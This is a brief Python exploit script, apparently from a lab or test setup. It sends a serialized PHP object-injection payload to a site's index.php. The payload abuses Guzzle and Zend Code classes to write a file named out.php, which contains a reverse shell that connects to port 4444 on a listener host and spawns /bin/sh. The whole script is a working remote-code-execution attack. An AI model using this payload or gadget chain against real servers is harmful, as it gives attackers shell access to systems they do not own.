#!/usr/bin/python

import requests

if __name__ == '__main__':
    data = {'data': 'a:2:{s:4:"name";s:4:"User";s:4:"z123";O:24:"GuzzleHttp\\Psr7\\FnStream":1:{s:9:"_fn_close";a:2:{i:0;O:33:"Zend\Code\Generator\FileGenerator":10:{s:11:"\0*\0filename";s:7:"out.php";s:11:"\0*\0docBlock";N;s:16:"\0*\0requiredFiles";a:0:{}s:12:"\0*\0namespace";N;s:7:"\0*\0uses";a:0:{}s:10:"\0*\0classes";a:0:{}s:7:"\0*\0body";s:81:"$sock=fsockopen("docker.for.mac.localhost",4444);exec("/bin/sh -i <&6 >&6 2>&6");";s:16:"\0*\0isSourceDirty";b:1;s:14:"\0*\0indentation";s:4:"    ";s:16:"\0*\0sourceContent";N;}i:1;s:5:"write";}}}','XDEBUG_SESSION_START': 'PHPSTORM'}
    session = requests.session()

    response = session.get('http://buggy.site:8080/index.php', params=data)

    print response.text.encode('utf-8')